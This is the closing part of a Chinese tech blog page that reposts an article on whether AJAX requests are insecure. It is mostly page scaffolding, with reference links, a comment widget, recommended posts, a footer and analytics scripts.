href=\x22http:\/\/blog.csdn.net\/fengyinchao\/article\/details\/50775121\x22 rel=\x22nofollow noreferrer\x22 target=\x22_blank\x22\x3e跨域资源共享(CORS)安全性浅析\x3c\/a\x3e\x3c\/li\x3e\n\x3cli\x3e\x3ca href=\x22https:\/\/segmentfault.com\/a\/1190000012469713?_ea=3085755\x22\x3eajax跨域，这应该是最全的解决方案了\x3c\/a\x3e\x3c\/li\x3e\n\x3c\/ul\x3e\n\n                \n"
            html = html.replace(/"{/g, "{")
            html = html.replace(/{"/g, "{")
            html = html.replace(/"}/g, "}")
            html = html.replace(/}"/g, "}")
            $('#raw').html(html);

            let postTitle =  $('.posttitle').text()
            let postContentTitle =  $('#raw > h1').text()
            if(postTitle === postContentTitle){
                $('#raw > h1').hide()
            }
            $('button.preview').hide()
        })</script></div><h1 id="版权声明">版权声明</h1><p>本文资源来源互联网，仅供学习研究使用，版权归该资源的合法拥有者所有，</p><p>本文仅用于学习、研究和交流目的。转载请注明出处、完整链接以及原作者。</p><p>原作者若认为本站侵犯了您的版权，请联系我们，我们会立即删除！</p><h2 id="原文标题">原文标题</h2><p>AJAX请求真的不安全么？谈谈Web安全与AJAX的关系。</p><h2 id="原文链接">原文链接</h2><p><a href="https://segmentfault.com/a/1190000012693772">https://segmentfault.com/a/1190000012693772</a></p><h2>本文链接：</h2><a href="https://alili.tech/archive/eniq8yfn2vm/" target="_blank">https://alili.tech/archive/eniq8yfn2vm/</a></div></article><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="//unpkg.com/valine/dist/Valine.min.js"></script><div class="blog-post-comments"></div><script>new Valine({
        el: '.blog-post-comments', 
        app_id: 'ItyOVb4I33bTwprf3cY6uqMc-gzGzoHsz', 
        app_key: 'hLhtmd4tT0qJbyO2SgQ8odya', 
        placeholder: '说点什么?', 
        avatar:'robohash',
        notify:true,
        verify:true
    });</script><ul id="more-post-list" class="archive readmore"><h3>其他推荐</h3><li><a href="/archive/hvvo3rmt3dj/">JS打包工具rollup——完全入门指南<aside class="dates">2019-01-04</aside></a></li><li><a href="/archive/semhn25oasq/">Spring Boot [基于Spring Boot 与 Vue的后台脚手架] SanJi Boot Security<aside class="dates">2019-01-04</aside></a></li><li><a href="/archive/t1iml4tjj7r/">WebGL入门demo<aside class="dates">2019-01-04</aside></a></li><li><a href="/archive/8gbs1y0r0ns/">[面试专题]一线互联网大厂面试总结<aside class="dates">2019-01-04</aside></a></li><li><a href="/archive/4os59l0zeel/">react&#43;react-router4&#43;redux最新版构建分享<aside class="dates">2019-01-04</aside></a></li><li><a href="/archive/dznv6a9ewcj/">react虚拟dom机制与diff算法<aside class="dates">2019-01-04</aside></a></li><li><a href="/archive/myiqarfowok/">一套Vue的单页模板：N3-admin<aside class="dates">2019-01-04</aside></a></li><li><a href="/archive/2eeweuxgjbk/">使用 json-server 搭建 api mock 服务 (一)<aside class="dates">2019-01-04</aside></a></li><li><a href="/archive/h7cszygcoqq/">使用Ionic3框架开始第一个混合开发APP<aside class="dates">2019-01-04</aside></a></li><li><a href="/archive/g8by6kv9q8t/">如何只用 CSS 完成漂亮的加载<aside class="dates">2019-01-04</aside></a></li></ul></section></div><footer id="footer"><div class="footer-left">Copyright © 2019 Fan <a href="http://www.miitbeian.gov.cn" rel="external nofollow noopener noreferrer" target="_blank">浙ICP备18045521号</a></div><div class="footer-right"><nav><ul><li><a href="/">Home</a></li><li><a href="/archive/">Archives</a></li><li><a href="/about/">About</a></li><li><a href="http://github.com/Fantasy9527" target="_blank">Github</a></li></ul></nav></div></footer><script src="https://alili.tech/lib/justified-gallery/jquery.justifiedGallery.min.js"></script><script src="https://alili.tech/lib/typed.js"></script><script src="https://alili.tech/js/main.js"></script><script async src=""></script><script>(function(){
  if(location.host!=='alili.tech')return;
  var ga = document.createElement('script');
  var curProtocol = window.location.protocol.split(':')[0];
  ga.src = 'https://www.googletagmanager.com/gtag/js?id=UA-129382678-1';       
  var s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(ga, s);
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-129382678-1');
})()</script><script>(function(){
    if(location.host!=='alili.tech')return;
      var bp = document.createElement('script');
      var curProtocol = window.location.protocol.split(':')[0];
      if (curProtocol === 'https') {
          bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
      }
      else {
          bp.src = 'http://push.zhanzhang.baidu.com/push.js';
      }
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(bp, s);
  })();</script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script>if ('serviceWorker' in navigator) {
      window.addEventListener('load', () => {
          navigator.serviceWorker
              .register('/sw.js')
              .then(registration => {
                  console.log('SW registered: ', registration);
              })
              .catch(registrationError => {
                  console.log('SW registration failed: ', registrationError);
              });
      });
  }</script></body></html>